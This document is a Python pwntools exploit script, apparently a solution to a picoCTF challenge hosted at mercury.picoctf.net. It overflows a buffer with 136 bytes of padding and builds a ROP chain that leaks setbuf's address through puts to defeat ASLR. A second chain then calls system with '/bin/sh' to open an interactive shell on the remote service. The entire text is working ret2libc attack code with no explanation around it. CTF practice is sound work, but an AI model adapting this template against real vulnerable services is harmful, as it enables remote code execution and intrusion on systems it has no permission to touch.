#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF('./vuln', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
rop = ROP(elf)


io = remote("mercury.picoctf.net", 23584)

padding = b"A"*136

payload = padding

payload += flat(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += flat(elf.got["setbuf"],elf.plt["puts"],elf.symbols["main"])

io.sendlineafter(b"VeR!",payload, timeout=1)
io.recvuntil(b"AAAd\n")

leak = u64(io.recvline().rstrip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols["setbuf"]

payload = padding

payload += flat(rop.find_gadget(['ret'])[0],rop.find_gadget(['pop rdi', 'ret'])[0])
payload += flat(next(libc.search(b"/bin/sh")),libc.symbols["system"], libc.sym['exit'])

io.sendline(payload)

io.interactive()
